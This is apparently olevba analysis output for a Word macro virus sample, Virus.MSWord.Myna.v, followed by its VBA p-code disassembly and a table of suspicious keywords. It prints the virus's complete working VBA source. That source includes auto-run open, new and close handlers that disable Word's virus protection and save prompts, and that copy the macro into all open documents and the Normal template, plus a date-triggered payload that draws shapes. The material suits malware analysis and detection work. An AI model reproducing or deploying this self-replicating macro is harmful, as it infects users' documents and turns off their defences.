olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Myna.v
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Myna.v - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
CB1070 = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
GI737 = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).codemodule.Lines(1, 3), 3) <> "Pri" Then
Set JU4247 = ActiveDocument.VBProject.VBComponents.Item(1)
NF8992 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).codemodule.Lines(1, 3), 3) <> "Pri" Then
Set JU4247 = NormalTemplate.VBProject.VBComponents.Item(1)
NF3452 = True
End If
End Sub

Private Sub Document_New()
'
Dim aready As Boolean
Dim star As Long
Dim send As Long
Dim answer As String
Dim path$
 Options.VirusProtection = False
 answer = "MYNAMEISVIRUS"
star = 1
send = 1
path$ = Options.DefaultFilePath(wdUserTemplatesPath)
If Count <> 1 Then
  Count = Count + 1
 ' Documents.Add
End If
If Documents.Count <> 0 Then
For i = 1 To Documents.Count
For Each xitem In Documents(i).VBProject.VBComponents
   ' If xitem.Name = "NewMacros" Then
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If
    End If
Next
Next
End If
  For Each xitem In NormalTemplate.VBProject.VBComponents
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If

    End If
Next
End Sub

Private Sub Document_Open()
Dim aready As Boolean
Dim star As Long
Dim send As Long
Dim answer As String
Dim path$
 answer = "MYNAMEISVIRUS"
  Options.VirusProtection = False
star = 1
send = 1
path$ = Options.DefaultFilePath(wdUserTemplatesPath)
If Count <> 1 Then
  Count = Count + 1
 ' Documents.Add
End If
If Documents.Count <> 0 Then
For i = 1 To Documents.Count
For Each xitem In Documents(i).VBProject.VBComponents
   ' If xitem.Name = "NewMacros" Then
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If
    End If
Next
Next
End If
  For Each xitem In NormalTemplate.VBProject.VBComponents
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If

    End If
Next
End Sub







































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Myna.v
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11413 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #3:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #4:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #5:
' 	Ld msoShapePentagon 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #6:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #7:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #8:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St CB1070 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St GI737 
' Line #11:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set JU4247 
' Line #13:
' 	LitVarSpecial (True)
' 	St NF8992 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set JU4247 
' Line #17:
' 	LitVarSpecial (True)
' 	St NF3452 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	EndSub 
' Line #20:
' Line #21:
' 	FuncDefn (Private Sub Document_New())
' Line #22:
' 	QuoteRem 0x0000 0x0000 ""
' Line #23:
' 	Dim 
' 	VarDefn aready (As Boolean)
' Line #24:
' 	Dim 
' 	VarDefn star (As Long)
' Line #25:
' 	Dim 
' 	VarDefn send (As Long)
' Line #26:
' 	Dim 
' 	VarDefn answer (As String)
' Line #27:
' 	Dim 
' 	VarDefn path
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #29:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	St answer 
' Line #30:
' 	LitDI2 0x0001 
' 	St star 
' Line #31:
' 	LitDI2 0x0001 
' 	St send 
' Line #32:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St path$ 
' Line #33:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #34:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	St Count 
' Line #35:
' 	QuoteRem 0x0001 0x000E " Documents.Add"
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #39:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #40:
' 	QuoteRem 0x0003 0x0021 " If xitem.Name = "NewMacros" Then"
' Line #41:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #42:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #43:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld star 
' 	Ld send 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #44:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #45:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #46:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #47:
' 	EndWith 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	StartForVariable 
' 	Next 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #54:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #55:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #56:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld send 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #57:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #58:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #59:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #60:
' 	EndWith 
' Line #61:
' 	EndIfBlock 
' Line #62:
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	StartForVariable 
' 	Next 
' Line #65:
' 	EndSub 
' Line #66:
' Line #67:
' 	FuncDefn (Private Sub Document_Open())
' Line #68:
' 	Dim 
' 	VarDefn aready (As Boolean)
' Line #69:
' 	Dim 
' 	VarDefn star (As Long)
' Line #70:
' 	Dim 
' 	VarDefn send (As Long)
' Line #71:
' 	Dim 
' 	VarDefn answer (As String)
' Line #72:
' 	Dim 
' 	VarDefn path
' Line #73:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	St answer 
' Line #74:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #75:
' 	LitDI2 0x0001 
' 	St star 
' Line #76:
' 	LitDI2 0x0001 
' 	St send 
' Line #77:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St path$ 
' Line #78:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #79:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	St Count 
' Line #80:
' 	QuoteRem 0x0001 0x000E " Documents.Add"
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #83:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #84:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #85:
' 	QuoteRem 0x0003 0x0021 " If xitem.Name = "NewMacros" Then"
' Line #86:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #87:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #88:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld star 
' 	Ld send 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #89:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #90:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #91:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #92:
' 	EndWith 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	StartForVariable 
' 	Next 
' Line #96:
' 	StartForVariable 
' 	Next 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #99:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #100:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #101:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld send 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #102:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #103:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #104:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #105:
' 	EndWith 
' Line #106:
' 	EndIfBlock 
' Line #107:
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	StartForVariable 
' 	Next 
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

